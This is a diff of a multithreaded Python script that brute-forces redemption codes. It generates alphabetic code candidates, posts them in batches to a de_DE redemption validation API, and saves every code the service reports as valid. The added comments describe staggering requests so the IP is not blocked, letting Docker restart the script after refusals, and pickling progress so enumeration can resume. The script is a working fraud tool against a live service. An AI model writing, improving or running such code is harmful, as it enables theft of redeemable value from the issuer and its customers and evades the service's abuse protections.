@@ -17,24 +17,21 @@ output_file_location = "output"
 url = os.environ["URL"]
 
 
-A_UPPERCASE = ord('A')
-ALPHABET_SIZE = 26
-
-
 def _decompose(number):
     """Generate digits from `number` in base alphabet, least significants
     bits first.
     """
 
     while number:
-        number, remainder = divmod(number - 1, ALPHABET_SIZE)
+        number, remainder = divmod(number - 1, 26)
         yield remainder
+
 
 def base_10_to_alphabet(number):
     """Convert a decimal number to its base alphabet representation"""
 
     return ''.join(
-            chr(A_UPPERCASE + part)
+            chr(ord('A') + part)
             for part in _decompose(number)
     )[::-1]
 
@@ -56,11 +53,9 @@ def check_codes(code_list):
 
     conn = http.client.HTTPSConnection(url)
 
-    payload = {
+    data = json.dumps({
         "codes": code_list
-    }
-
-    data = json.dumps(payload)
+    })
 
     headers = {
         'Content-Type': 'application/json;charset=UTF-8',
@@ -70,6 +65,7 @@ def check_codes(code_list):
         'Content-Length': str(len(data)),
         'Connection': 'keep-alive'
     }
+
     response_data = None
     try:
         conn.request("POST", "/api/de_DE/redemption/validate-codes", data, headers)
@@ -81,12 +77,13 @@ def check_codes(code_list):
             if code_response["status"] == "Valid":
                 valid_codes.append(code_list[code_response["item"]])
 
+        return valid_codes
+
+    # non 200 response or no response, exit the program
     except Exception as ex:
         print("Exception: " + str(ex))
         print(response_data)
         return None
-
-    return valid_codes
 
 
 class MinerThread(threading.Thread):
@@ -112,17 +109,22 @@ class Context:
         self.restart_indicies = []
 
     def is_not_finished(self):
-        return self.next_index <= 8353082583*26 or len(self.running_indices) != 0
+        # are there still ranges to check and/or are there still unfinished threads?
+        return self.next_index <= 8353082583*26 or len(self.running_indices) != 0 or len(self.restart_indicies) != 0
 
 
 if __name__ == '__main__':
+
+    # Shared between the threads to return their results to the main thread
     shared_queue = queue.Queue()
 
+    # see if there already is data from previous runs
     try:
         ctx = pickle.load(open(output_file_location + "/progress.pickle", "rb"))
         ctx.restart_indicies = ctx.restart_indicies + ctx.running_indices.copy()
         ctx.running_indices = []
 
+    # if not, create a new context
     except (OSError, IOError) as e:
         ctx = Context()
         pickle.dump(ctx, open(output_file_location + "/progress.pickle", "wb"))
@@ -131,6 +133,8 @@ if __name__ == '__main__':
         while len(ctx.running_indices) < max_number_of_threads:
 
             index = 0
+
+            # if there are threads that did not finish in the last run, recheck their index range
             if ctx.restart_indicies:
                 index = ctx.restart_indicies.pop()
                 print("Restarting Thread for " + str(index) + " - " + str(index + codes_per_thread))
@@ -142,24 +146,31 @@ if __name__ == '__main__':
             thread = MinerThread(shared_queue, index)
             thread.start()
             ctx.running_indices.append(index)
+
+            # do not send all requests at once, otherwise the chance of our IP being blocked is higher
             time.sleep(staggered_thread_launch_delay)
 
-        (index, values) = shared_queue.get()
+        (thread_index, values) = shared_queue.get()
+
+        # if a thread did not get a 200, stop the program. Docker will take care of restarting it later.
         if values is None:
             pickle.dump(ctx, open(output_file_location + "/progress.pickle", "wb"))
             print("Thread returned None, stopping")
             sys.exit(1)
 
         ctx.valid_codes.extend(values)
-        ctx.running_indices.remove(index)
+        ctx.running_indices.remove(thread_index)
 
+        # every time 'pickle_intervall' codes are checked, save the current progress
         if ctx.running_indices and min(ctx.running_indices) >= ctx.last_pickled_index + pickle_interval:
             print("Progress: " + str(((min(ctx.running_indices)-8353082583)/(8353082583*25))*100) + "% done")
             pickle.dump(ctx, open(output_file_location + "/progress.pickle", "wb"))
             ctx.last_pickled_index = min(ctx.running_indices)
 
-        print("Checked range " + str(index) + " - " + str(index+codes_per_thread))
+        print("Checked range " + str(thread_index) + " - " + str(thread_index+codes_per_thread))
         print("Running threads: " + str(len(ctx.running_indices) - shared_queue.qsize()) + " of " + str(max_number_of_threads))
+
+        # safe valid codes to the output file
         for value in values:
             with open(output_file_location + '/codes.txt', 'a') as f:
                 f.write(value + "\n")
